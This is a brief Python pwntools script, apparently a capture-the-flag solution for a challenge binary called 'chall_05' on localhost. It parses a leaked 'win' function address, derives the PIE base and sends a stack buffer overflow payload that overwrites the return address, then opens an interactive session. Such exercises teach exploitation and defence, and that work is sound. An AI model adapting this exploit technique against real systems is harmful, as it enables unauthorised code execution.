from pwn import *

target = remote("localhost", 30005)
# target = process("./chall_05")
# gdb.attach(target)

target.recvline()
target.sendline(b"00")

leak = target.recvline()
leak = leak.split(b"win: ")[1]
leak = int(leak, 16)

pie_base = leak - 0x76d 

print("leak is: %s" % hex(leak))

payload = b"0"*0x38
payload += p64(pie_base + 0x75a)

target.sendline(payload)

target.interactive()
